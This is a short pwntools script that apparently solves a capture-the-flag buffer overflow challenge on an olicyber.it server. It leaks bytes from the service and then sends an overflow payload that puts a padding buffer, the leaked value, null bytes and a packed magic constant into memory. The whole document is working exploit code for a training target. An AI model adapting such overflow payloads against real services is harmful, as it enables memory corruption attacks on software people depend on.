from pwn import *
r = remote("big-overflow.challs.olicyber.it", 34003)
r.recv(100)
payload = b'a'*31
r.sendline(payload)
r.recvline()
ex = r.recvuntil(b"but").replace(b"but", b"")
gab = p32(0x5ab1bb0, endian="little")
print(ex + b"  " + gab)
r.recv()
r.send(b'a'*32 + ex + 2 * b"\x00" + gab)
r.recv()
print(r.recv())
